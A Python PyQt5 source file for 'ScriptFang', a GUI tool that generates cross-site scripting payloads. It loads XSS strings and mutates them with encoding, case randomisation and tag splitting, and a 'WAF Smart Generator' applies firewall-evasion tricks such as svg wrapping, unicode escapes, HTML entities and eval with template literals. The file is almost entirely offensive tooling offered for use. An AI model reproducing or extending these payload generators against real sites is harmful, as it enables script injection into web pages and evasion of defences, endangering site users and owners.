import sys
import random
import os
from PyQt5.QtWidgets import (
    QApplication, QWidget, QLabel, QVBoxLayout, QPushButton,
    QTextEdit, QLineEdit, QHBoxLayout, QFileDialog
)
from PyQt5.QtGui import QMovie, QFont, QColor
from PyQt5.QtCore import Qt

def load_payloads():
    try:
        with open("payloads/xss.txt", "r") as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        return ["<script>alert('XSS');</script>"]

def mutate_payload(payload):
    variants = [
        payload.replace("<", "%3C"),
        payload.replace("script", "scr<script>ipt"),
        payload.replace("alert", "a\u006cert"),
        ''.join(random.choice([c.upper(), c.lower()]) for c in payload),
        payload.replace("=", "%3D"),
    ]
    return random.choice(variants)

def generate_waf_bypass(payload):
    tricks = [
        payload.replace("<", "<svg><script>"),
        payload.replace("script", "scr\\u0069pt"),
        payload.replace("=", "&#x3D;"),
        payload.replace("alert", "eval`alert(1)`"),
    ]
    return random.choice(tricks)

class ScriptFangGUI(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("ScriptFang Payload Generator")
        self.setGeometry(100, 100, 900, 650)

        layout = QVBoxLayout()
        self.setLayout(layout)

        self.background = QLabel(self)
        self.movie = QMovie("assets/dragons.gif")
        self.background.setMovie(self.movie)
        self.movie.start()
        self.background.setScaledContents(True)
        self.background.setFixedSize(900, 650)
        self.background.lower()

        # Title
        title = QLabel("ScriptFang")
        title.setStyleSheet("color: white; font-size: 28px;")
        title.setAlignment(Qt.AlignCenter)

        self.payload_display = QTextEdit()
        self.payload_display.setReadOnly(True)
        self.payload_display.setStyleSheet("background-color: #111; color: #0f0;")

        self.target_input = QLineEdit()
        self.target_input.setPlaceholderText("Enter target domain (e.g. https://example.com)")
        self.target_input.setStyleSheet("background-color: #222; color: white;")

        # Buttons
        button_layout = QHBoxLayout()

        self.generate_button = QPushButton("Generate Payload")
        self.generate_button.clicked.connect(self.generate_payload)

        self.mutate_button = QPushButton("Mutate Payloads")
        self.mutate_button.clicked.connect(self.mutate_payload)

        self.waf_button = QPushButton("WAF Smart Generator")
        self.waf_button.clicked.connect(self.waf_payload)

        button_style = "background-color: #333; color: white; padding: 5px;"
        for btn in [self.generate_button, self.mutate_button, self.waf_button]:
            btn.setStyleSheet(button_style)
            btn.setFixedWidth(160)

        button_layout.addWidget(self.generate_button)
        button_layout.addWidget(self.mutate_button)
        button_layout.addWidget(self.waf_button)

        layout.addWidget(title)
        layout.addWidget(self.target_input)
        layout.addLayout(button_layout)
        layout.addWidget(self.payload_display)

        credit = QLabel("Made by Talyx | GitHub: Talyx66")
        credit.setStyleSheet("color: gray; font-size: 12px;")
        credit.setAlignment(Qt.AlignRight)
        layout.addWidget(credit)

    def generate_payload(self):
        payloads = load_payloads()
        selected = random.choice(payloads)
        self.display_payload(selected)

    def mutate_payload(self):
        payloads = load_payloads()
        original = random.choice(payloads)
        mutated = mutate_payload(original)
        self.display_payload(mutated)

    def waf_payload(self):
        payloads = load_payloads()
        original = random.choice(payloads)
        bypass = generate_waf_bypass(original)
        self.display_payload(bypass)

    def display_payload(self, payload):
        self.payload_display.clear()
        self.payload_display.append(payload)

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = ScriptFangGUI()
    window.show()
    sys.exit(app.exec_())
